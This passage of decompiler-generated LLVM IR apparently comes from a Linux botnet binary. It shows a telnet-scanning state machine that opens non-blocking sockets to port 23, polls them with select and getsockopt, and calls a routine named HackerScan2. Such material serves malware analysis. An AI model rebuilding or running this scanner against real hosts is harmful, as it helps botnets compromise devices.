  %v2_805baee = add i32 %v2_805baec, %v2_805ba15
  %v1_805baf0 = add i32 %v2_805baee, 16
  store i32 %v1_805baf0, i32* %eax.global-to-local, align 4
  %v1_805baf3 = inttoptr i32 %v1_805baf0 to i32*
  %v2_805baf3 = load i32, i32* %v1_805baf3, align 4
  store i32 %v2_805baf3, i32* %eax.global-to-local, align 4
  %v1_805baf5 = icmp eq i32 %v2_805baf3, 0
  %v1_805baf7 = icmp eq i1 %v1_805baf5, false
  br i1 %v1_805baf7, label %dec_label_pc_805bb26, label %dec_label_pc_805baf9

dec_label_pc_805baf9:                             ; preds = %dec_label_pc_805bad8
  store i32 %storemerge44, i32* @ebx, align 4
  %v0_805bafc = load i32, i32* @esp, align 4
  %v1_805bafc = inttoptr i32 %v0_805bafc to i32*
  store i32 0, i32* %v1_805bafc, align 4
  %v1_805bb03 = inttoptr i32 %storemerge44 to i32*
  %v2_805bb03 = call i32 @__GI_time(i32* %v1_805bb03)
  store i32 %v2_805bb03, i32* @esi, align 4
  %v0_805bb0d = load i32, i32* @ebx, align 4
  %v1_805bb0f = mul i32 %v0_805bb0d, 4
  store i32 %v1_805bb0f, i32* %edx.global-to-local, align 4
  %v2_805bb1d = mul i32 %v0_805bb0d, 28
  %v2_805bb1f = add i32 %v2_805bb1d, %v2_805ba15
  %v1_805bb21 = add i32 %v2_805bb1f, 16
  store i32 %v1_805bb21, i32* %eax.global-to-local, align 4
  %v2_805bb24 = inttoptr i32 %v1_805bb21 to i32*
  store i32 %v2_805bb03, i32* %v2_805bb24, align 4
  br label %dec_label_pc_805bb26

dec_label_pc_805bb26:                             ; preds = %dec_label_pc_805bad8, %dec_label_pc_805baf9
  store i32 %v1_805bade, i32* %edx.global-to-local, align 4
  store i32 %v2_805baec, i32* %eax.global-to-local, align 4
  %v3_805bb3c = add i32 %v2_805bb3c, %v2_805baec
  %v4_805bb3c = inttoptr i32 %v3_805bb3c to i8*
  %v5_805bb3c = load i8, i8* %v4_805bb3c, align 4
  %v6_805bb3c = zext i8 %v5_805bb3c to i32
  store i32 %v6_805bb3c, i32* %eax.global-to-local, align 4
  %v5_805bb44 = inttoptr i32 %v6_805bb3c to i8*
  store i32 %v6_805bb3c, i32* %edx.global-to-local, align 4
  %v1_805bb5d = mul nuw nsw i32 %v6_805bb3c, 4
  %v2_805bb5d = add nuw nsw i32 %v1_805bb5d, 134663100
  %v3_805bb5d = inttoptr i32 %v2_805bb5d to i32*
  %v4_805bb5d = load i32, i32* %v3_805bb5d, align 4
  store i32 %v4_805bb5d, i32* %eax.global-to-local, align 4
  switch i8 %v5_805bb3c, label %dec_label_pc_805cc2b [
    i8 0, label %dec_label_pc_805bb66
    i8 1, label %dec_label_pc_805bf20
    i8 2, label %dec_label_pc_805c28e
    i8 3, label %dec_label_pc_805c3c3
    i8 4, label %dec_label_pc_805c51f
    i8 5, label %dec_label_pc_805c654
    i8 6, label %dec_label_pc_805c7b0
    i8 7, label %dec_label_pc_805cad7
  ]

dec_label_pc_805bb66:                             ; preds = %dec_label_pc_805bb26
  store i32 %v1_805bade, i32* %edx.global-to-local, align 4
  store i32 %v2_805baec, i32* %eax.global-to-local, align 4
  %v3_805bb7c = add i32 %v2_805ba9b, %v2_805baec
  %v4_805bb7c = inttoptr i32 %v3_805bb7c to i8*
  %v5_805bb7c = load i8, i8* %v4_805bb7c, align 1
  %v10_805bb81 = icmp eq i8 %v5_805bb7c, 1
  %v1_805bb83 = icmp eq i1 %v10_805bb81, false
  store i32 %v1_805bade, i32* %edx.global-to-local, align 4
  store i32 %v2_805baec, i32* %eax.global-to-local, align 4
  br i1 %v1_805bb83, label %dec_label_pc_805bc25, label %dec_label_pc_805bb89

dec_label_pc_805bb89:                             ; preds = %dec_label_pc_805bb66
  %v1_805bba1 = add i32 %v2_805baee, 24
  store i32 %v1_805bba1, i32* %eax.global-to-local, align 4
  %v1_805bba4 = inttoptr i32 %v1_805bba1 to i32*
  %v2_805bba4 = load i32, i32* %v1_805bba4, align 4
  store i32 %v1_805bade, i32* %edx.global-to-local, align 4
  store i32 %v2_805baee, i32* %eax.global-to-local, align 4
  %v0_805bbc2 = load i32, i32* @esp, align 4
  %v1_805bbc2 = add i32 %v0_805bbc2, 8
  %v2_805bbc2 = inttoptr i32 %v1_805bbc2 to i32*
  store i32 28, i32* %v2_805bbc2, align 4
  %v0_805bbca = load i32, i32* @esp, align 4
  %v1_805bbca = add i32 %v0_805bbca, 4
  %v2_805bbca = inttoptr i32 %v1_805bbca to i32*
  store i32 0, i32* %v2_805bbca, align 4
  %v0_805bbd2 = load i32, i32* %eax.global-to-local, align 4
  %v1_805bbd2 = load i32, i32* @esp, align 4
  %v2_805bbd2 = inttoptr i32 %v1_805bbd2 to i32*
  store i32 %v0_805bbd2, i32* %v2_805bbd2, align 4
  %v2_805bbd5 = load i32, i32* %stack_var_-608, align 4
  %v5_805bbd5 = call i32 @__GI_memset(i8* %v5_805bb44, i32 %v2_805bbd5, i32 %stack_var_-604.243)
  store i32 %v1_805bba1, i32* %edx.global-to-local, align 4
  store i32 %v2_805bba4, i32* %eax.global-to-local, align 4
  store i32 %v2_805bba4, i32* %v1_805bba4, align 4
  store i32 %storemerge44, i32* @ebx, align 4
  %v2_805bbfd = call i32 @HackerScan2(i32 %v2_805bba4, i32 %stack_var_-24.241)
  %v0_805bc07 = load i32, i32* @ebx, align 4
  %v1_805bc09 = mul i32 %v0_805bc07, 4
  store i32 %v1_805bc09, i32* %edx.global-to-local, align 4
  %v2_805bc17 = mul i32 %v0_805bc07, 28
  %v2_805bc19 = add i32 %v2_805bc17, %v2_805ba15
  %v1_805bc1b = add i32 %v2_805bc19, 4
  store i32 %v1_805bc1b, i32* %eax.global-to-local, align 4
  %v2_805bc1e = inttoptr i32 %v1_805bc1b to i32*
  store i32 %v2_805bbfd, i32* %v2_805bc1e, align 4
  br label %dec_label_pc_805bd3c

dec_label_pc_805bc25:                             ; preds = %dec_label_pc_805bb66
  %v5_805bc3b = load i8, i8* %v4_805bb7c, align 1
  %v6_805bc3b = zext i8 %v5_805bc3b to i32
  store i32 %v6_805bc3b, i32* %eax.global-to-local, align 4
  %v4_805bc40 = icmp eq i8 %v5_805bc3b, 0
  %v1_805bc42 = icmp eq i1 %v4_805bc40, false
  br i1 %v1_805bc42, label %dec_label_pc_805bd3c, label %dec_label_pc_805bc48

dec_label_pc_805bc48:                             ; preds = %dec_label_pc_805bc25
  store i32 %v1_805bade, i32* %edx.global-to-local, align 4
  store i32 %v2_805baec, i32* %eax.global-to-local, align 4
  %v3_805bc60 = add i32 %v2_805bc60, %v2_805baec
  %v4_805bc60 = inttoptr i32 %v3_805bc60 to i8*
  %v5_805bc60 = load i8, i8* %v4_805bc60, align 1
  %v1_805bc65 = add i8 %v5_805bc60, 1
  store i8 %v1_805bc65, i8* %v4_805bc60, align 1
  store i32 %v1_805bade, i32* %edx.global-to-local, align 4
  store i32 %v2_805baec, i32* %eax.global-to-local, align 4
  %v3_805bc9b = add i32 %v2_805bc9b, %v2_805baec
  %v4_805bc9b = inttoptr i32 %v3_805bc9b to i8*
  %v5_805bc9b = load i8, i8* %v4_805bc9b, align 2
  %v6_805bc9b = zext i8 %v5_805bc9b to i32
  %v1_805bca0 = add nuw nsw i32 %v6_805bc9b, 1
  store i32 %v1_805bca0, i32* @esi, align 4
  %v1_805bcba = trunc i32 %v1_805bca0 to i8
  store i8 %v1_805bcba, i8* %v4_805bc9b, align 2
  store i32 %v1_805bade, i32* %edx.global-to-local, align 4
  store i32 %v2_805baec, i32* %eax.global-to-local, align 4
  %v5_805bcd4 = load i8, i8* %v4_805bc60, align 1
  %v10_805bcd9 = icmp eq i8 %v5_805bcd4, 3
  %v1_805bcdb = icmp eq i1 %v10_805bcd9, false
  store i32 %v1_805bade, i32* %edx.global-to-local, align 4
  store i32 %v2_805baec, i32* %eax.global-to-local, align 4
  br i1 %v1_805bcdb, label %dec_label_pc_805bcfd, label %dec_label_pc_805bcdd

dec_label_pc_805bcdd:                             ; preds = %dec_label_pc_805bc48
  store i8 1, i8* %v4_805bb7c, align 1
  br label %dec_label_pc_805cc2b

dec_label_pc_805bcfd:                             ; preds = %dec_label_pc_805bc48
  %v5_805bd13 = load i8, i8* %v4_805bc9b, align 2
  %v6_805bd13 = zext i8 %v5_805bd13 to i32
  store i32 %v6_805bd13, i32* %eax.global-to-local, align 4
  %v10_805bd18 = icmp eq i8 %v5_805bd13, 3
  %v1_805bd1a = icmp eq i1 %v10_805bd18, false
  br i1 %v1_805bd1a, label %dec_label_pc_805bd3c, label %dec_label_pc_805bd1c

dec_label_pc_805bd1c:                             ; preds = %dec_label_pc_805bcfd
  store i32 %v1_805bade, i32* %edx.global-to-local, align 4
  store i32 %v2_805baec, i32* %eax.global-to-local, align 4
  store i8 1, i8* %v4_805bb7c, align 1
  br label %dec_label_pc_805cc2b

dec_label_pc_805bd3c:                             ; preds = %dec_label_pc_805bcfd, %dec_label_pc_805bc25, %dec_label_pc_805bb89
  store i32 2, i32* %stack_var_-608, align 4
  %v0_805bd45 = load i32, i32* @esp, align 4
  %v1_805bd45 = inttoptr i32 %v0_805bd45 to i32*
  store i32 23, i32* %v1_805bd45, align 4
  %v0_805bd4c = load i32, i32* %stack_var_-608, align 4
  %v1_805bd4c = trunc i32 %v0_805bd4c to i16
  %v2_805bd4c = call i32 @__GI_htons(i16 %v1_805bd4c)
  %v0_805bd58 = load i32, i32* @esp, align 4
  %v1_805bd58 = add i32 %v0_805bd58, 8
  %v2_805bd58 = inttoptr i32 %v1_805bd58 to i32*
  store i32 8, i32* %v2_805bd58, align 4
  %v0_805bd60 = load i32, i32* @esp, align 4
  %v1_805bd60 = add i32 %v0_805bd60, 4
  %v2_805bd60 = inttoptr i32 %v1_805bd60 to i32*
  store i32 0, i32* %v2_805bd60, align 4
  store i32 %v15_805b9ac, i32* %eax.global-to-local, align 4
  %v1_805bd71 = load i32, i32* @esp, align 4
  %v2_805bd71 = inttoptr i32 %v1_805bd71 to i32*
  store i32 %v15_805b9ac, i32* %v2_805bd71, align 4
  %sext = mul i32 %v2_805bd4c, 65536
  %v1_805bd74 = sdiv i32 %sext, 65536
  %v4_805bd74 = inttoptr i32 %v1_805bd74 to i8*
  %v5_805bd74 = call i32 @__GI_memset(i8* %v4_805bd74, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_805bade, i32* %edx.global-to-local, align 4
  %v1_805bd91 = add i32 %v2_805baee, 4
  store i32 %v1_805bd91, i32* %eax.global-to-local, align 4
  %v1_805bd94 = inttoptr i32 %v1_805bd91 to i32*
  %v2_805bd94 = load i32, i32* %v1_805bd94, align 4
  store i32 %v2_805bd94, i32* %eax.global-to-local, align 4
  store i32 %storemerge44, i32* @ebx, align 4
  %v0_805bd9f = load i32, i32* @esp, align 4
  %v1_805bd9f = add i32 %v0_805bd9f, 8
  %v2_805bd9f = inttoptr i32 %v1_805bd9f to i32*
  store i32 0, i32* %v2_805bd9f, align 4
  %v0_805bda7 = load i32, i32* @esp, align 4
  %v1_805bda7 = add i32 %v0_805bda7, 4
  %v2_805bda7 = inttoptr i32 %v1_805bda7 to i32*
  store i32 1, i32* %v2_805bda7, align 4
  %v0_805bdaf = load i32, i32* @esp, align 4
  %v1_805bdaf = inttoptr i32 %v0_805bdaf to i32*
  store i32 2, i32* %v1_805bdaf, align 4
  %v1_805bdb6 = call i32 @socket(i32 %v2_805bd94)
  store i32 %v1_805bdb6, i32* @esi, align 4
  %v0_805bdc0 = load i32, i32* @ebx, align 4
  %v2_805bdd0 = mul i32 %v0_805bdc0, 28
  %v3_805bdd2 = add i32 %v2_805bdd0, %v2_805ba15
  %v4_805bdd2 = inttoptr i32 %v3_805bdd2 to i32*
  store i32 %v1_805bdb6, i32* %v4_805bdd2, align 4
  store i32 %v1_805bade, i32* %edx.global-to-local, align 4
  store i32 %v2_805baec, i32* %eax.global-to-local, align 4
  %v3_805bdeb = inttoptr i32 %v2_805baee to i32*
  %v4_805bdeb = load i32, i32* %v3_805bdeb, align 4
  store i32 %v4_805bdeb, i32* %eax.global-to-local, align 4
  %v10_805bdee = icmp eq i32 %v4_805bdeb, -1
  br i1 %v10_805bdee, label %dec_label_pc_805cc2b, label %dec_label_pc_805bdf7

dec_label_pc_805bdf7:                             ; preds = %dec_label_pc_805bd3c
  store i32 %v1_805bade, i32* %edx.global-to-local, align 4
  store i32 %v2_805baec, i32* %eax.global-to-local, align 4
  %v4_805be0d = load i32, i32* %v3_805bdeb, align 4
  store i32 %v4_805be0d, i32* %eax.global-to-local, align 4
  %v0_805be10 = load i32, i32* @esp, align 4
  %v1_805be10 = add i32 %v0_805be10, 8
  %v2_805be10 = inttoptr i32 %v1_805be10 to i32*
  store i32 0, i32* %v2_805be10, align 4
  %v0_805be18 = load i32, i32* @esp, align 4
  %v1_805be18 = add i32 %v0_805be18, 4
  %v2_805be18 = inttoptr i32 %v1_805be18 to i32*
  store i32 3, i32* %v2_805be18, align 4
  %v0_805be20 = load i32, i32* %eax.global-to-local, align 4
  %v1_805be20 = load i32, i32* @esp, align 4
  %v2_805be20 = inttoptr i32 %v1_805be20 to i32*
  store i32 %v0_805be20, i32* %v2_805be20, align 4
  %v1_805be23 = load i32, i32* %stack_var_-600, align 4
  %v3_805be23 = call i32 @__libc_fcntl(i32 %v2_805bd94, i32 %v1_805be23, i32 ptrtoint (i32* @0 to i32))
  %v12_805be2a = or i32 %v3_805be23, 2048
  store i32 %v12_805be2a, i32* @ebx, align 4
  store i32 %v1_805bade, i32* %edx.global-to-local, align 4
  store i32 %v2_805baec, i32* %eax.global-to-local, align 4
  %v4_805be43 = load i32, i32* %v3_805bdeb, align 4
  store i32 %v4_805be43, i32* %eax.global-to-local, align 4
  %v1_805be46 = load i32, i32* @esp, align 4
  %v2_805be46 = add i32 %v1_805be46, 8
  %v3_805be46 = inttoptr i32 %v2_805be46 to i32*
  store i32 %v12_805be2a, i32* %v3_805be46, align 4
  %v0_805be4a = load i32, i32* @esp, align 4
  %v1_805be4a = add i32 %v0_805be4a, 4
  %v2_805be4a = inttoptr i32 %v1_805be4a to i32*
  store i32 4, i32* %v2_805be4a, align 4
  %v0_805be52 = load i32, i32* %eax.global-to-local, align 4
  %v1_805be52 = load i32, i32* @esp, align 4
  %v2_805be52 = inttoptr i32 %v1_805be52 to i32*
  store i32 %v0_805be52, i32* %v2_805be52, align 4
  %v1_805be55 = load i32, i32* %stack_var_-600, align 4
  %v3_805be55 = call i32 @__libc_fcntl(i32 %v2_805bd94, i32 %v1_805be55, i32 ptrtoint (i32* @0 to i32))
  store i32 %v2_805b9a6, i32* @ebx, align 4
  store i32 %v1_805bade, i32* %edx.global-to-local, align 4
  store i32 %v2_805baec, i32* %eax.global-to-local, align 4
  %v4_805be76 = load i32, i32* %v3_805bdeb, align 4
  store i32 %v4_805be76, i32* %eax.global-to-local, align 4
  %v0_805be79 = load i32, i32* @esp, align 4
  %v1_805be79 = add i32 %v0_805be79, 8
  %v2_805be79 = inttoptr i32 %v1_805be79 to i32*
  store i32 16, i32* %v2_805be79, align 4
  %v1_805be81 = load i32, i32* @esp, align 4
  %v2_805be81 = add i32 %v1_805be81, 4
  %v3_805be81 = inttoptr i32 %v2_805be81 to i32*
  store i32 %v2_805b9a6, i32* %v3_805be81, align 4
  %v0_805be85 = load i32, i32* %eax.global-to-local, align 4
  %v1_805be85 = load i32, i32* @esp, align 4
  %v2_805be85 = inttoptr i32 %v1_805be85 to i32*
  store i32 %v0_805be85, i32* %v2_805be85, align 4
  %v1_805be88 = load i32, i32* %stack_var_-600, align 4
  %v3_805be88 = call i32 @__libc_connect(i32 %v2_805bd94, i32 %v1_805be88, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_805be88, i32* %eax.global-to-local, align 4
  %v10_805be8d = icmp eq i32 %v3_805be88, -1
  %v1_805be90 = icmp eq i1 %v10_805be8d, false
  br i1 %v1_805be90, label %dec_label_pc_805bedf, label %dec_label_pc_805be92

dec_label_pc_805be92:                             ; preds = %dec_label_pc_805bdf7
  %v1_805be92 = call i32 @__GI___errno_location(i32 %v2_805bd94)
  store i32 %v1_805be92, i32* %eax.global-to-local, align 4
  %v1_805be97 = inttoptr i32 %v1_805be92 to i32*
  %v2_805be97 = load i32, i32* %v1_805be97, align 4
  store i32 %v2_805be97, i32* %eax.global-to-local, align 4
  %v9_805be99 = icmp eq i32 %v2_805be97, 115
  br i1 %v9_805be99, label %dec_label_pc_805bedf, label %dec_label_pc_805be9e

dec_label_pc_805be9e:                             ; preds = %dec_label_pc_805be92
  store i32 %v1_805bade, i32* %edx.global-to-local, align 4
  store i32 %v2_805baec, i32* %eax.global-to-local, align 4
  %v4_805beb4 = load i32, i32* %v3_805bdeb, align 4
  store i32 %v4_805beb4, i32* %eax.global-to-local, align 4
  %v1_805beb7 = load i32, i32* @esp, align 4
  %v2_805beb7 = inttoptr i32 %v1_805beb7 to i32*
  store i32 %v4_805beb4, i32* %v2_805beb7, align 4
  %v1_805beba = call i32 @sclose(i32 %v2_805bd94)
  store i32 %v1_805bade, i32* %edx.global-to-local, align 4
  store i32 %v2_805baec, i32* %eax.global-to-local, align 4
  store i8 1, i8* %v4_805bb7c, align 1
  br label %dec_label_pc_805cc2b

dec_label_pc_805bedf:                             ; preds = %dec_label_pc_805be92, %dec_label_pc_805bdf7
  store i8 1, i8* %v4_805bb3c, align 4
  store i32 %v1_805bade, i32* %edx.global-to-local, align 4
  store i32 %v1_805baf0, i32* %eax.global-to-local, align 4
  store i32 0, i32* %v1_805baf3, align 4
  br label %dec_label_pc_805cc2b

dec_label_pc_805bf20:                             ; preds = %dec_label_pc_805bb26
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %v2_805bf2a, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_805bf31 = call i8* @_memset(i8* %tmp33, i32 0, i32 32)
  %v6_805bf31 = ptrtoint i8* %v5_805bf31 to i32
  store i32 %v1_805bade, i32* %edx.global-to-local, align 4
  store i32 %v2_805baec, i32* %eax.global-to-local, align 4
  %v3_805bf4f = inttoptr i32 %v2_805baee to i32*
  %v4_805bf4f = load i32, i32* %v3_805bf4f, align 4
  %v2_805bf54 = udiv i32 %v4_805bf4f, 32
  store i32 %v2_805bf54, i32* @ebx, align 4
  store i32 %v1_805bade, i32* %edx.global-to-local, align 4
  store i32 %v2_805baec, i32* %eax.global-to-local, align 4
  %v4_805bf6d = load i32, i32* %v3_805bf4f, align 4
  %v1_805bf70 = urem i32 %v4_805bf6d, 32
  store i32 %v1_805bf70, i32* %eax.global-to-local, align 4
  %v0_805bf73 = load i32, i32* @ebp, align 4
  %v2_805bf73 = mul nuw nsw i32 %v2_805bf54, 4
  %v3_805bf73 = add nsw i32 %v2_805bf73, -316
  %v4_805bf73 = add i32 %v3_805bf73, %v0_805bf73
  %v5_805bf73 = inttoptr i32 %v4_805bf73 to i32*
  %v6_805bf73 = load i32, i32* %v5_805bf73, align 4
  %v9_805bf73 = shl i32 1, %v1_805bf70
  %v12_805bf73 = or i32 %v6_805bf73, %v9_805bf73
  store i32 %v12_805bf73, i32* %v5_805bf73, align 4
  store i32 0, i32* %stack_var_-328, align 4
  store i32 %v1_805bade, i32* %edx.global-to-local, align 4
  store i32 %v2_805baec, i32* %eax.global-to-local, align 4
  %v4_805bfa4 = load i32, i32* %v3_805bf4f, align 4
  %v1_805bfa7 = add i32 %v4_805bfa4, 1
  store i32 %v1_805bfa7, i32* %edx.global-to-local, align 4
  %v1_805bfb0 = load i32, i32* @esp, align 4
  %v2_805bfb0 = add i32 %v1_805bfb0, 16
  %v3_805bfb0 = inttoptr i32 %v2_805bfb0 to i32*
  store i32 %v2_805bfaa, i32* %v3_805bfb0, align 4
  %v0_805bfb4 = load i32, i32* @esp, align 4
  %v1_805bfb4 = add i32 %v0_805bfb4, 12
  %v2_805bfb4 = inttoptr i32 %v1_805bfb4 to i32*
  store i32 0, i32* %v2_805bfb4, align 4
  store i32 %v2_805bf2a, i32* %eax.global-to-local, align 4
  %v1_805bfc2 = load i32, i32* @esp, align 4
  %v2_805bfc2 = add i32 %v1_805bfc2, 8
  %v3_805bfc2 = inttoptr i32 %v2_805bfc2 to i32*
  store i32 %v2_805bf2a, i32* %v3_805bfc2, align 4
  %v0_805bfc6 = load i32, i32* @esp, align 4
  %v1_805bfc6 = add i32 %v0_805bfc6, 4
  %v2_805bfc6 = inttoptr i32 %v1_805bfc6 to i32*
  store i32 0, i32* %v2_805bfc6, align 4
  %v0_805bfce = load i32, i32* %edx.global-to-local, align 4
  %v1_805bfce = load i32, i32* @esp, align 4
  %v2_805bfce = inttoptr i32 %v1_805bfce to i32*
  store i32 %v0_805bfce, i32* %v2_805bfce, align 4
  %v0_805bfd1 = load i32, i32* %stack_var_-328, align 4
  %v2_805bfd1 = load i32, i32* %stack_var_-320, align 4
  %v5_805bfd1 = call i32 @__libc_select(i32 %v0_805bfd1, i32 10, i32 %v2_805bfd1, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_805bfd1, i32* %eax.global-to-local, align 4
  %v12_805bfd9 = icmp eq i32 %v5_805bfd1, 1
  %v1_805bfdd = icmp eq i1 %v12_805bfd9, false
  br i1 %v1_805bfdd, label %dec_label_pc_805c19c, label %dec_label_pc_805bfe3

dec_label_pc_805bfe3:                             ; preds = %dec_label_pc_805bf20
  store i32 4, i32* %stack_var_-332, align 4
  store i8* null, i8** %stack_var_-336, align 4
  store i32 %v1_805bade, i32* %edx.global-to-local, align 4
  store i32 %v2_805baec, i32* %eax.global-to-local, align 4
  %v4_805c00d = load i32, i32* %v3_805bf4f, align 4
  store i32 %v4_805c00d, i32* %edx.global-to-local, align 4
  %v1_805c016 = load i32, i32* @esp, align 4
  %v2_805c016 = add i32 %v1_805c016, 16
  %v3_805c016 = inttoptr i32 %v2_805c016 to i32*
  store i32 %v2_805c010, i32* %v3_805c016, align 4
  store i32 %v2_805c01a, i32* %eax.global-to-local, align 4
  %v1_805c020 = load i32, i32* @esp, align 4
  %v2_805c020 = add i32 %v1_805c020, 12
  %v3_805c020 = inttoptr i32 %v2_805c020 to i32*
  store i32 %v2_805c01a, i32* %v3_805c020, align 4
  %v0_805c024 = load i32, i32* @esp, align 4
  %v1_805c024 = add i32 %v0_805c024, 8
  %v2_805c024 = inttoptr i32 %v1_805c024 to i32*
  store i32 4, i32* %v2_805c024, align 4
  %v0_805c02c = load i32, i32* @esp, align 4
  %v1_805c02c = add i32 %v0_805c02c, 4
  %v2_805c02c = inttoptr i32 %v1_805c02c to i32*
  store i32 1, i32* %v2_805c02c, align 4
  %v0_805c034 = load i32, i32* %edx.global-to-local, align 4
  %v1_805c034 = load i32, i32* @esp, align 4
  %v2_805c034 = inttoptr i32 %v1_805c034 to i32*
  store i32 %v0_805c034, i32* %v2_805c034, align 4
  %v0_805c037 = load i8*, i8** %stack_var_-336, align 4
  %v1_805c037 = ptrtoint i8* %v0_805c037 to i32
  %v2_805c037 = load i32, i32* %stack_var_-332, align 4
  %v3_805c037 = load i32, i32* %stack_var_-328, align 4
  %v5_805c037 = load i32, i32* %stack_var_-320, align 4
  %v6_805c037 = call i32 @getsockopt(i32 %v1_805c037, i32 %v2_805c037, i32 %v3_805c037, i32 10, i32 %v5_805c037)
  %v3_805c03c = load i8*, i8** %stack_var_-336, align 4
  %v1_805c042 = icmp eq i8* %v3_805c03c, null
  store i32 %v1_805bade, i32* %edx.global-to-local, align 4
  store i32 %v2_805baec, i32* %eax.global-to-local, align 4
  %v4_805c0b8 = load i32, i32* %v3_805bf4f, align 4
  store i32 %v4_805c0b8, i32* %eax.global-to-local, align 4
  %v0_805c0bb = load i32, i32* @esp, align 4
  br i1 %v1_805c042, label %dec_label_pc_805c0a2, label %dec_label_pc_805c046

dec_label_pc_805c046:                             ; preds = %dec_label_pc_805bfe3
  %v2_805c05f = inttoptr i32 %v0_805c0bb to i32*
  store i32 %v4_805c0b8, i32* %v2_805c05f, align 4
  %v0_805c062 = load i8*, i8** %stack_var_-336, align 4
  %v1_805c062 = ptrtoint i8* %v0_805c062 to i32
  %v2_805c062 = call i32 @sclose(i32 %v1_805c062)
  store i8 0, i8* %v4_805bb3c, align 4
  store i32 %v1_805bade, i32* %edx.global-to-local, align 4
  store i32 %v2_805baec, i32* %eax.global-to-local, align 4
  %v3_805c098 = add i32 %v2_805ba9b, %v2_805baec
  %v4_805c098 = inttoptr i32 %v3_805c098 to i8*
  store i8 1, i8* %v4_805c098, align 1
  br label %dec_label_pc_805cc2b

dec_label_pc_805c0a2:                             ; preds = %dec_label_pc_805bfe3
  %v1_805c0bb = add i32 %v0_805c0bb, 8
  %v2_805c0bb = inttoptr i32 %v1_805c0bb to i32*
  store i32 0, i32* %v2_805c0bb, align 4
  %v0_805c0c3 = load i32, i32* @esp, align 4
  %v1_805c0c3 = add i32 %v0_805c0c3, 4
  %v2_805c0c3 = inttoptr i32 %v1_805c0c3 to i32*
  store i32 3, i32* %v2_805c0c3, align 4
  %v0_805c0cb = load i32, i32* %eax.global-to-local, align 4
  %v1_805c0cb = load i32, i32* @esp, align 4
  %v2_805c0cb = inttoptr i32 %v1_805c0cb to i32*
  store i32 %v0_805c0cb, i32* %v2_805c0cb, align 4
  %v0_805c0ce = load i8*, i8** %stack_var_-336, align 4
  %v1_805c0ce = ptrtoint i8* %v0_805c0ce to i32
  %v2_805c0ce = load i32, i32* %stack_var_-332, align 4
  %v3_805c0ce = load i32, i32* %stack_var_-328, align 4
  %v4_805c0ce = call i32 @__libc_fcntl(i32 %v1_805c0ce, i32 %v2_805c0ce, i32 %v3_805c0ce)
  %v13_805c0d5 = and i32 %v4_805c0ce, -2049
  store i32 %v13_805c0d5, i32* @ebx, align 4
  store i32 %v1_805bade, i32* %edx.global-to-local, align 4
  store i32 %v2_805baec, i32* %eax.global-to-local, align 4
  %v4_805c0ee = load i32, i32* %v3_805bf4f, align 4
  store i32 %v4_805c0ee, i32* %eax.global-to-local, align 4
  %v1_805c0f1 = load i32, i32* @esp, align 4
  %v2_805c0f1 = add i32 %v1_805c0f1, 8
  %v3_805c0f1 = inttoptr i32 %v2_805c0f1 to i32*
  store i32 %v13_805c0d5, i32* %v3_805c0f1, align 4
  %v0_805c0f5 = load i32, i32* @esp, align 4
  %v1_805c0f5 = add i32 %v0_805c0f5, 4
  %v2_805c0f5 = inttoptr i32 %v1_805c0f5 to i32*
  store i32 4, i32* %v2_805c0f5, align 4
  %v0_805c0fd = load i32, i32* %eax.global-to-local, align 4
  %v1_805c0fd = load i32, i32* @esp, align 4
  %v2_805c0fd = inttoptr i32 %v1_805c0fd to i32*
  store i32 %v0_805c0fd, i32* %v2_805c0fd, align 4
  %v0_805c100 = load i8*, i8** %stack_var_-336, align 4
  %v1_805c100 = ptrtoint i8* %v0_805c100 to i32
  %v2_805c100 = load i32, i32* %stack_var_-332, align 4
  %v3_805c100 = load i32, i32* %stack_var_-328, align 4
  %v4_805c100 = call i32 @__libc_fcntl(i32 %v1_805c100, i32 %v2_805c100, i32 %v3_805c100)
  store i32 0, i32* %v1_805baf3, align 4
  %v1_805c141 = add i32 %v2_805baee, 20
  %v2_805c141 = inttoptr i32 %v1_805c141 to i16*
  store i16 0, i16* %v2_805c141, align 4
  store i32 %v1_805bade, i32* %edx.global-to-local, align 4
  %v1_805c15f = add i32 %v2_805baee, 24
  store i32 %v1_805c15f, i32* %eax.global-to-local, align 4
  %v1_805c162 = inttoptr i32 %v1_805c15f to i32*
  %v2_805c162 = load i32, i32* %v1_805c162, align 4
  store i32 %v2_805c162, i32* %eax.global-to-local, align 4
  %v0_805c164 = load i32, i32* @esp, align 4
  %v1_805c164 = add i32 %v0_805c164, 8
  %v2_805c164 = inttoptr i32 %v1_805c164 to i32*
  store i32 32676, i32* %v2_805c164, align 4
  %v0_805c16c = load i32, i32* @esp, align 4
  %v1_805c16c = add i32 %v0_805c16c, 4
  %v2_805c16c = inttoptr i32 %v1_805c16c to i32*
  store i32 0, i32* %v2_805c16c, align 4
  %v0_805c174 = load i32, i32* %eax.global-to-local, align 4
  %v1_805c174 = load i32, i32* @esp, align 4
  %v2_805c174 = inttoptr i32 %v1_805c174 to i32*
  store i32 %v0_805c174, i32* %v2_805c174, align 4
  %v0_805c177 = load i8*, i8** %stack_var_-336, align 4
  %v2_805c177 = load i32, i32* %stack_var_-332, align 4
  %v3_805c177 = load i32, i32* %stack_var_-328, align 4
  %v5_805c177 = call i32 @__GI_memset(i8* %v0_805c177, i32 %v2_805c177, i32 %v3_805c177)
  store i32 %v1_805bade, i32* %edx.global-to-local, align 4
  store i32 %v2_805baec, i32* %eax.global-to-local, align 4
  store i8 2, i8* %v4_805bb3c, align 4
  br label %dec_label_pc_805cc2b

dec_label_pc_805c19c:                             ; preds = %dec_label_pc_805bf20
  %v13_805c19c = icmp eq i32 %v5_805bfd1, -1
  %v1_805c1a0 = icmp eq i1 %v13_805c19c, false
  store i32 %v1_805bade, i32* %edx.global-to-local, align 4
  store i32 %v2_805baec, i32* %eax.global-to-local, align 4
  br i1 %v1_805c1a0, label %dec_label_pc_805c1fe, label %dec_label_pc_805c1a2

dec_label_pc_805c1a2:                             ; preds = %dec_label_pc_805c19c
  %v4_805c1b8 = load i32, i32* %v3_805bf4f, align 4
  store i32 %v4_805c1b8, i32* %eax.global-to-local, align 4
  %v1_805c1bb = load i32, i32* @esp, align 4
  %v2_805c1bb = inttoptr i32 %v1_805c1bb to i32*
  store i32 %v4_805c1b8, i32* %v2_805c1bb, align 4
  %v1_805c1be = call i32 @sclose(i32 %v5_805bfd1)
  store i8 0, i8* %v4_805bb3c, align 4
